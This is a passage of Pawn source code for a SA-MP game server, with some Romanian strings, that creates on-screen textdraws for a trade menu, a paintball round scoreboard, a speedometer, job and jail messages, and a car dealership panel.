	PlayerTextDrawSetShadow(playerid, TradeTD[35], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[35], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[35], -1);
	PlayerTextDrawFont(playerid, TradeTD[35], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[35], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[35], 0);

	TradeTD[36] = CreatePlayerTextDraw(playerid, 383.299407, 321.672637, "NRG-500_(KM:_34,_Vechime:_5_zile)");
	PlayerTextDrawLetterSize(playerid, TradeTD[36], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[36], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[36], 2);
	PlayerTextDrawColor(playerid, TradeTD[36], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[36], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[36], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[36], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[36], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[36], -1);
	PlayerTextDrawFont(playerid, TradeTD[36], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[36], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[36], 0);

	TradeTD[37] = CreatePlayerTextDraw(playerid, 383.299407, 346.174133, "CASA_ID:_4");
	PlayerTextDrawLetterSize(playerid, TradeTD[37], 0.169999, 0.564000);
	PlayerTextDrawTextSize(playerid, TradeTD[37], 0.000000, 124.000000);
	PlayerTextDrawAlignment(playerid, TradeTD[37], 2);
	PlayerTextDrawColor(playerid, TradeTD[37], -1);
	PlayerTextDrawUseBox(playerid, TradeTD[37], 1);
	PlayerTextDrawBoxColor(playerid, TradeTD[37], 505290495);
	PlayerTextDrawSetShadow(playerid, TradeTD[37], 0);
	PlayerTextDrawSetOutline(playerid, TradeTD[37], 0);
	PlayerTextDrawBackgroundColor(playerid, TradeTD[37], -1);
	PlayerTextDrawFont(playerid, TradeTD[37], 2);
	PlayerTextDrawSetProportional(playerid, TradeTD[37], 1);
	PlayerTextDrawSetShadow(playerid, TradeTD[37], 0);
	
	PaintTD[0] = CreatePlayerTextDraw(playerid, 179.500000, 412.250000, "LD_POOL:BALL");
	PlayerTextDrawLetterSize(playerid, PaintTD[0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PaintTD[0], 44.000000, 35.000000);
	PlayerTextDrawAlignment(playerid, PaintTD[0], 1);
	PlayerTextDrawColor(playerid, PaintTD[0], 336860415);
	PlayerTextDrawSetShadow(playerid, PaintTD[0], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[0], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[0], 255);
	PlayerTextDrawFont(playerid, PaintTD[0], 4);
	PlayerTextDrawSetProportional(playerid, PaintTD[0], 0);
	PlayerTextDrawSetShadow(playerid, PaintTD[0], 0);

	PaintTD[1] = CreatePlayerTextDraw(playerid, 209.500000, 415.750000, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, PaintTD[1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PaintTD[1], 183.000000, 28.000000);
	PlayerTextDrawAlignment(playerid, PaintTD[1], 1);
	PlayerTextDrawColor(playerid, PaintTD[1], 336860300);
	PlayerTextDrawSetShadow(playerid, PaintTD[1], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[1], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[1], 255);
	PlayerTextDrawFont(playerid, PaintTD[1], 4);
	PlayerTextDrawSetProportional(playerid, PaintTD[1], 0);
	PlayerTextDrawSetShadow(playerid, PaintTD[1], 0);

	PaintTD[2] = CreatePlayerTextDraw(playerid, 198.500000, 418.375000, "i");
	PlayerTextDrawLetterSize(playerid, PaintTD[2], 0.640500, 2.313123);
	PlayerTextDrawAlignment(playerid, PaintTD[2], 1);
	PlayerTextDrawColor(playerid, PaintTD[2], -1);
	PlayerTextDrawSetShadow(playerid, PaintTD[2], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[2], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[2], 255);
	PlayerTextDrawFont(playerid, PaintTD[2], 3);
	PlayerTextDrawSetProportional(playerid, PaintTD[2], 1);
	PlayerTextDrawSetShadow(playerid, PaintTD[2], 0);

	PaintTD[3] = CreatePlayerTextDraw(playerid, 227.800048, 425.375000, "WAITING_TO_PLAYERS...");
	PlayerTextDrawLetterSize(playerid, PaintTD[3], 0.257000, 0.943749);
	PlayerTextDrawAlignment(playerid, PaintTD[3], 1);
	PlayerTextDrawColor(playerid, PaintTD[3], 1019100415);
	PlayerTextDrawSetShadow(playerid, PaintTD[3], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[3], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[3], 255);
	PlayerTextDrawFont(playerid, PaintTD[3], 2);
	PlayerTextDrawSetProportional(playerid, PaintTD[3], 1);
	PlayerTextDrawSetShadow(playerid, PaintTD[3], 0);

	PaintTD[4] = CreatePlayerTextDraw(playerid, 472.500000, 360.625000, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, PaintTD[4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PaintTD[4], 172.000000, 53.000000);
	PlayerTextDrawAlignment(playerid, PaintTD[4], 1);
	PlayerTextDrawColor(playerid, PaintTD[4], 336860340);
	PlayerTextDrawSetShadow(playerid, PaintTD[4], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[4], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[4], 255);
	PlayerTextDrawFont(playerid, PaintTD[4], 4);
	PlayerTextDrawSetProportional(playerid, PaintTD[4], 0);
	PlayerTextDrawSetShadow(playerid, PaintTD[4], 0);

	PaintTD[5] = CreatePlayerTextDraw(playerid, 603.500000, 369.762603, "Scorul_tau:_~r~1");
	PlayerTextDrawLetterSize(playerid, PaintTD[5], 0.292000, 0.921875);
	PlayerTextDrawAlignment(playerid, PaintTD[5], 3);
	PlayerTextDrawColor(playerid, PaintTD[5], -1);
	PlayerTextDrawSetShadow(playerid, PaintTD[5], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[5], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[5], 255);
	PlayerTextDrawFont(playerid, PaintTD[5], 2);
	PlayerTextDrawSetProportional(playerid, PaintTD[5], 1);
	PlayerTextDrawSetShadow(playerid, PaintTD[5], 0);

	PaintTD[6] = CreatePlayerTextDraw(playerid, 629.000000, 400.975433, "Round ends in ~r~00:30");
	PlayerTextDrawLetterSize(playerid, PaintTD[6], 0.208500, 0.733750);
	PlayerTextDrawAlignment(playerid, PaintTD[6], 3);
	PlayerTextDrawColor(playerid, PaintTD[6], -1);
	PlayerTextDrawSetShadow(playerid, PaintTD[6], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[6], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[6], 255);
	PlayerTextDrawFont(playerid, PaintTD[6], 2);
	PlayerTextDrawSetProportional(playerid, PaintTD[6], 1);
	PlayerTextDrawSetShadow(playerid, PaintTD[6], 0);

	PaintTD[7] = CreatePlayerTextDraw(playerid, 633.700317, 386.062316, "TERORISTI:_~r~10_~w~/_CONTRA-TERORISTI:_~R~5");
	PlayerTextDrawLetterSize(playerid, PaintTD[7], 0.190999, 0.751250);
	PlayerTextDrawAlignment(playerid, PaintTD[7], 3);
	PlayerTextDrawColor(playerid, PaintTD[7], -1);
	PlayerTextDrawSetShadow(playerid, PaintTD[7], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[7], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[7], 255);
	PlayerTextDrawFont(playerid, PaintTD[7], 2);
	PlayerTextDrawSetProportional(playerid, PaintTD[7], 1);
	PlayerTextDrawSetShadow(playerid, PaintTD[7], 0);
	
	PaintTD[8] = CreatePlayerTextDraw(playerid, 214.699951, 414.437500, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, PaintTD[8], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PaintTD[8], 247.000000, 28.000000);
	PlayerTextDrawAlignment(playerid, PaintTD[8], 1);
	PlayerTextDrawColor(playerid, PaintTD[8], 336860300);
	PlayerTextDrawSetShadow(playerid, PaintTD[8], 0);
	PlayerTextDrawSetOutline(playerid, PaintTD[8], 0);
	PlayerTextDrawBackgroundColor(playerid, PaintTD[8], 255);
	PlayerTextDrawFont(playerid, PaintTD[8], 4);
	PlayerTextDrawSetProportional(playerid, PaintTD[8], 0);
	PlayerTextDrawSetShadow(playerid, PaintTD[8], 0);
	return 1;
}
stock LoadPTDS(playerid)
{
	TDKM[playerid][0] = CreatePlayerTextDraw(playerid, 574.500000, 378.125000, "~R~D~W~_N_R");
	PlayerTextDrawLetterSize(playerid, TDKM[playerid][0], 0.377000, 1.403125);
	PlayerTextDrawAlignment(playerid, TDKM[playerid][0], 3);
	PlayerTextDrawColor(playerid, TDKM[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, TDKM[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, TDKM[playerid][0], 255);
	PlayerTextDrawFont(playerid, TDKM[playerid][0], 2);
	PlayerTextDrawSetProportional(playerid, TDKM[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][0], 0);

	TDKM[playerid][1] = CreatePlayerTextDraw(playerid, 556.000000, 340.500000, "SPEED:_222_KM/H");
	PlayerTextDrawLetterSize(playerid, TDKM[playerid][1], 0.182000, 0.821250);
	PlayerTextDrawAlignment(playerid, TDKM[playerid][1], 2);
	PlayerTextDrawColor(playerid, TDKM[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, TDKM[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, TDKM[playerid][1], 255);
	PlayerTextDrawFont(playerid, TDKM[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, TDKM[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][1], 0);

	TDKM[playerid][2] = CreatePlayerTextDraw(playerid, 558.000000, 350.125000, "Fuel:_100_L");
	PlayerTextDrawLetterSize(playerid, TDKM[playerid][2], 0.182000, 0.821250);
	PlayerTextDrawAlignment(playerid, TDKM[playerid][2], 2);
	PlayerTextDrawColor(playerid, TDKM[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, TDKM[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, TDKM[playerid][2], 255);
	PlayerTextDrawFont(playerid, TDKM[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, TDKM[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][2], 0);

	TDKM[playerid][3] = CreatePlayerTextDraw(playerid, 588.500000, 359.675048, "STATUS:_~r~Incuiat");
	PlayerTextDrawLetterSize(playerid, TDKM[playerid][3], 0.182000, 0.821250);
	PlayerTextDrawAlignment(playerid, TDKM[playerid][3], 3);
	PlayerTextDrawColor(playerid, TDKM[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, TDKM[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, TDKM[playerid][3], 255);
	PlayerTextDrawFont(playerid, TDKM[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, TDKM[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][3], 0);

	TDKM[playerid][4] = CreatePlayerTextDraw(playerid, 558.000000, 368.500000, "Odometer:_100_KM");
	PlayerTextDrawLetterSize(playerid, TDKM[playerid][4], 0.182000, 0.821250);
	PlayerTextDrawAlignment(playerid, TDKM[playerid][4], 2);
	PlayerTextDrawColor(playerid, TDKM[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, TDKM[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, TDKM[playerid][4], 255);
	PlayerTextDrawFont(playerid, TDKM[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, TDKM[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, TDKM[playerid][4], 0);

	farmbox[playerid] = CreatePlayerTextDraw(playerid, 199.599990, 185.926666, "usebox");
	PlayerTextDrawLetterSize(playerid, farmbox[playerid], 0.000000, 7.149999);
	PlayerTextDrawTextSize(playerid, farmbox[playerid], -3.599999, 0.000000);
	PlayerTextDrawAlignment(playerid, farmbox[playerid], 1);
	PlayerTextDrawColor(playerid, farmbox[playerid], 0);
	PlayerTextDrawUseBox(playerid, farmbox[playerid], true);
	PlayerTextDrawBoxColor(playerid, farmbox[playerid], 102);
	PlayerTextDrawSetShadow(playerid, farmbox[playerid], 0);
	PlayerTextDrawSetOutline(playerid, farmbox[playerid], 0);
	PlayerTextDrawFont(playerid, farmbox[playerid], 0);

	farmjob[playerid] = CreatePlayerTextDraw(playerid, 6.399997, 183.679962, "JOB");
	PlayerTextDrawLetterSize(playerid, farmjob[playerid], 0.449999, 1.600000);
	PlayerTextDrawAlignment(playerid, farmjob[playerid], 1);
	PlayerTextDrawColor(playerid, farmjob[playerid], -1);
	PlayerTextDrawSetShadow(playerid, farmjob[playerid], 0);
	PlayerTextDrawSetOutline(playerid, farmjob[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, farmjob[playerid], 51);
	PlayerTextDrawFont(playerid, farmjob[playerid], 0);
	PlayerTextDrawSetProportional(playerid, farmjob[playerid], 1);

	farmspeed[playerid] = CreatePlayerTextDraw(playerid, 3.199995, 219.519958, "~r~(!) You have to go at a speed greater than 25 KM/H.");
	PlayerTextDrawLetterSize(playerid, farmspeed[playerid], 0.193999, 1.555199);
	PlayerTextDrawAlignment(playerid, farmspeed[playerid], 1);
	PlayerTextDrawColor(playerid, farmspeed[playerid], -1);
	PlayerTextDrawSetShadow(playerid, farmspeed[playerid], 0);
	PlayerTextDrawSetOutline(playerid, farmspeed[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, farmspeed[playerid], 255);
	PlayerTextDrawFont(playerid, farmspeed[playerid], 1);
	PlayerTextDrawSetProportional(playerid, farmspeed[playerid], 1);

	farmtime[playerid] = CreatePlayerTextDraw(playerid, 2.399992, 203.093383, " ");
	PlayerTextDrawLetterSize(playerid, farmtime[playerid], 0.204399, 1.592533);
	PlayerTextDrawAlignment(playerid, farmtime[playerid], 1);
	PlayerTextDrawColor(playerid, farmtime[playerid], -1);
	PlayerTextDrawSetShadow(playerid, farmtime[playerid], 0);
	PlayerTextDrawSetOutline(playerid, farmtime[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, farmtime[playerid], 255);
	PlayerTextDrawFont(playerid, farmtime[playerid], 1);
	PlayerTextDrawSetProportional(playerid, farmtime[playerid], 1);

	gunoierr[playerid] = CreatePlayerTextDraw(playerid, 523.199890, 142.613327, " ");
	PlayerTextDrawLetterSize(playerid, gunoierr[playerid], 0.219599, 1.689600);
	PlayerTextDrawAlignment(playerid, gunoierr[playerid], 1);
	PlayerTextDrawColor(playerid, gunoierr[playerid], -1);
	PlayerTextDrawSetShadow(playerid, gunoierr[playerid], 0);
	PlayerTextDrawSetOutline(playerid, gunoierr[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, gunoierr[playerid], 255);
	PlayerTextDrawFont(playerid, gunoierr[playerid], 2);
	PlayerTextDrawSetProportional(playerid, gunoierr[playerid], 1);

	farmwanted[playerid] = CreatePlayerTextDraw(playerid, 2.400026, 219.520034, "~r~Go back to ranch will receive wanted !");
	PlayerTextDrawLetterSize(playerid, farmwanted[playerid], 0.241199, 1.697066);
	PlayerTextDrawAlignment(playerid, farmwanted[playerid], 1);
	PlayerTextDrawColor(playerid, farmwanted[playerid], -1);
	PlayerTextDrawSetShadow(playerid, farmwanted[playerid], 0);
	PlayerTextDrawSetOutline(playerid, farmwanted[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, farmwanted[playerid], 255);
	PlayerTextDrawFont(playerid, farmwanted[playerid], 1);
	PlayerTextDrawSetProportional(playerid, farmwanted[playerid], 1);

	Jailtime[playerid] = CreatePlayerTextDraw(playerid, 504.000000, 97.000000, " ");
	PlayerTextDrawLetterSize(playerid, Jailtime[playerid], 0.219998, 1.800000);
	PlayerTextDrawColor(playerid, Jailtime[playerid], -1);
	PlayerTextDrawSetShadow(playerid, Jailtime[playerid], 1);
	PlayerTextDrawSetOutline(playerid, Jailtime[playerid], 1);
	PlayerTextDrawFont(playerid, Jailtime[playerid], 1);

	Bus1[playerid] = CreatePlayerTextDraw(playerid, 256.000030, 351.431243, "Please wait a moment...");
	PlayerTextDrawLetterSize(playerid, Bus1[playerid], 0.292799, 1.614933);
	PlayerTextDrawColor(playerid, Bus1[playerid], -136734721);
	PlayerTextDrawSetShadow(playerid, Bus1[playerid], 1);
	PlayerTextDrawSetOutline(playerid, Bus1[playerid], 1);
	PlayerTextDrawFont(playerid, Bus1[playerid], 1);

	Bus2[playerid] = CreatePlayerTextDraw(playerid, 270.000030, 364.373382, " ");
	PlayerTextDrawLetterSize(playerid, Bus2[playerid], 0.206000, 1.525333);
	PlayerTextDrawColor(playerid, Bus2[playerid], -1);
	PlayerTextDrawSetShadow(playerid, Bus2[playerid], 1);
	PlayerTextDrawSetOutline(playerid, Bus2[playerid], 1);
	PlayerTextDrawFont(playerid, Bus2[playerid], 1);

	TextDrawSpec[playerid][1] = CreatePlayerTextDraw(playerid, 224.799926, 317.333343, " ");
	PlayerTextDrawLetterSize(playerid, TextDrawSpec[playerid][1], 0.392397, 2.219732);
	PlayerTextDrawAlignment(playerid, TextDrawSpec[playerid][1], 1);
	PlayerTextDrawColor(playerid, TextDrawSpec[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, TextDrawSpec[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, TextDrawSpec[playerid][1], 1);
	PlayerTextDrawBackgroundColor(playerid, TextDrawSpec[playerid][1], 255);
	PlayerTextDrawFont(playerid, TextDrawSpec[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, TextDrawSpec[playerid][1], 1);

	TextDrawSpec[playerid][2] = CreatePlayerTextDraw(playerid, 224.800003, 336.746551, " ");
	PlayerTextDrawLetterSize(playerid, TextDrawSpec[playerid][2], 0.434798, 2.092799);
	PlayerTextDrawAlignment(playerid, TextDrawSpec[playerid][2], 1);
	PlayerTextDrawColor(playerid, TextDrawSpec[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, TextDrawSpec[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, TextDrawSpec[playerid][2], 1);
	PlayerTextDrawBackgroundColor(playerid, TextDrawSpec[playerid][2], 255);
	PlayerTextDrawFont(playerid, TextDrawSpec[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, TextDrawSpec[playerid][2], 1);

	TextDrawSpec[playerid][3] = CreatePlayerTextDraw(playerid, 225.599975, 356.159973, " ");
	PlayerTextDrawLetterSize(playerid, TextDrawSpec[playerid][3], 0.437999, 2.182399);
	PlayerTextDrawAlignment(playerid, TextDrawSpec[playerid][3], 1);
	PlayerTextDrawColor(playerid, TextDrawSpec[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, TextDrawSpec[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, TextDrawSpec[playerid][3], 1);
	PlayerTextDrawBackgroundColor(playerid, TextDrawSpec[playerid][3], 255);
	PlayerTextDrawFont(playerid, TextDrawSpec[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, TextDrawSpec[playerid][3], 1);

	TextDrawSpec[playerid][4] = CreatePlayerTextDraw(playerid, 226.400039, 375.573486, " ");
	PlayerTextDrawLetterSize(playerid, TextDrawSpec[playerid][4], 0.408400, 2.040534);
	PlayerTextDrawAlignment(playerid, TextDrawSpec[playerid][4], 1);
	PlayerTextDrawColor(playerid, TextDrawSpec[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, TextDrawSpec[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, TextDrawSpec[playerid][4], 1);
	PlayerTextDrawBackgroundColor(playerid, TextDrawSpec[playerid][4], 255);
	PlayerTextDrawFont(playerid, TextDrawSpec[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, TextDrawSpec[playerid][4], 1);

	TextDrawSpec[playerid][5] = CreatePlayerTextDraw(playerid, 226.399963, 394.240020, " ");
	PlayerTextDrawLetterSize(playerid, TextDrawSpec[playerid][5], 0.430000, 1.958400);
	PlayerTextDrawAlignment(playerid, TextDrawSpec[playerid][5], 1);
	PlayerTextDrawColor(playerid, TextDrawSpec[playerid][5], -1);
	PlayerTextDrawSetShadow(playerid, TextDrawSpec[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, TextDrawSpec[playerid][5], 1);
	PlayerTextDrawBackgroundColor(playerid, TextDrawSpec[playerid][5], 255);
	PlayerTextDrawFont(playerid, TextDrawSpec[playerid][5], 2);
	PlayerTextDrawSetProportional(playerid, TextDrawSpec[playerid][5], 1);

	HUD[1][playerid] = CreatePlayerTextDraw(playerid,575.199768, 65.706687, " ");
	PlayerTextDrawAlignment(playerid,HUD[1][playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,HUD[1][playerid], 255);
	PlayerTextDrawFont(playerid,HUD[1][playerid], 1);
	PlayerTextDrawLetterSize(playerid,HUD[1][playerid], 0.310799, 1.151998);
	PlayerTextDrawColor(playerid,HUD[1][playerid], 16711935);
	PlayerTextDrawSetOutline(playerid,HUD[1][playerid], 0);
	PlayerTextDrawSetProportional(playerid,HUD[1][playerid], 1);
	PlayerTextDrawSetShadow(playerid,HUD[1][playerid], 1);
	PlayerTextDrawSetSelectable(playerid,HUD[1][playerid], 0);

	HUD[2][playerid] = CreatePlayerTextDraw(playerid,575.199768, 43.306674, " ");
	PlayerTextDrawAlignment(playerid,HUD[2][playerid], 2);
	PlayerTextDrawBackgroundColor(playerid,HUD[2][playerid], 255);
	PlayerTextDrawFont(playerid,HUD[2][playerid], 1);
	PlayerTextDrawLetterSize(playerid,HUD[2][playerid], 0.310799, 1.151998);
	PlayerTextDrawColor(playerid,HUD[2][playerid], 16711935);
	PlayerTextDrawSetOutline(playerid,HUD[2][playerid], 0);
	PlayerTextDrawSetProportional(playerid,HUD[2][playerid], 1);
	PlayerTextDrawSetShadow(playerid,HUD[2][playerid], 1);
	PlayerTextDrawSetSelectable(playerid,HUD[2][playerid], 0);

	HUD[3][playerid] = CreatePlayerTextDraw(playerid,2.000000, 434.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,HUD[3][playerid], 255);
	PlayerTextDrawFont(playerid,HUD[3][playerid], 3);
	PlayerTextDrawLetterSize(playerid,HUD[3][playerid], 0.500000, 1.299999);
	PlayerTextDrawColor(playerid,HUD[3][playerid], 0xFFFF00FF);
	PlayerTextDrawSetOutline(playerid,HUD[3][playerid], 0);
	PlayerTextDrawSetProportional(playerid,HUD[3][playerid], 1);
	PlayerTextDrawSetShadow(playerid,HUD[3][playerid], 1);
	PlayerTextDrawSetSelectable(playerid,HUD[3][playerid], 0);

	RentCar[playerid] = CreatePlayerTextDraw(playerid, 45.333335, 320.237182, " ");
	PlayerTextDrawLetterSize(playerid, RentCar[playerid], 0.244333, 1.716147);
	PlayerTextDrawAlignment(playerid, RentCar[playerid], 1);
	PlayerTextDrawColor(playerid, RentCar[playerid], -1);
	PlayerTextDrawSetShadow(playerid, RentCar[playerid], 0);
	PlayerTextDrawSetOutline(playerid, RentCar[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, RentCar[playerid], 255);
	PlayerTextDrawFont(playerid, RentCar[playerid], 3);
	PlayerTextDrawSetProportional(playerid, RentCar[playerid], 1);
	
	DealerShipTD[playerid][0] = CreatePlayerTextDraw(playerid, 23.500000, 333.937500, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][0], 137.000000, 96.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][0], 0);

	DealerShipTD[playerid][1] = CreatePlayerTextDraw(playerid, 24.800018, 335.675079, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][1], 134.000000, 93.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][1], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][1], 320084479);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][1], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][1], 0);

	DealerShipTD[playerid][2] = CreatePlayerTextDraw(playerid, 29.000000, 339.187500, "LD_BEAT:LEFT");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][2], 15.000000, 10.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][2], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][2], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][2], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][2], 1);

	DealerShipTD[playerid][3] = CreatePlayerTextDraw(playerid, 135.899032, 338.687469, "LD_BEAT:RIGHT");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][3], 15.000000, 10.000000);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][3], 1);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][3], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][3], 4);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, DealerShipTD[playerid][3], 1);

	DealerShipTD[playerid][4] = CreatePlayerTextDraw(playerid, 91.500000, 340.562530, "INFERNUS");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][4], 0.230498, 0.624373);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][4], 2);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][4], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][4], 0);

	DealerShipTD[playerid][5] = CreatePlayerTextDraw(playerid, 91.500000, 358.937530, "STOCK:_50~n~CULOARE_1:_1~n~CULOARE_2:_1~n~VITEZA_MAXIMA:_220_KM/H");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][5], 0.182999, 0.703123);
	PlayerTextDrawAlignment(playerid, DealerShipTD[playerid][5], 2);
	PlayerTextDrawColor(playerid, DealerShipTD[playerid][5], -1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, DealerShipTD[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, DealerShipTD[playerid][5], 255);
	PlayerTextDrawFont(playerid, DealerShipTD[playerid][5], 2);
	PlayerTextDrawSetProportional(playerid, DealerShipTD[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, DealerShipTD[playerid][5], 0);

	DealerShipTD[playerid][6] = CreatePlayerTextDraw(playerid, 42.500000, 355.812500, "");
	PlayerTextDrawLetterSize(playerid, DealerShipTD[playerid][6], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DealerShipTD[playerid][6], 90.000000, 90.000000);
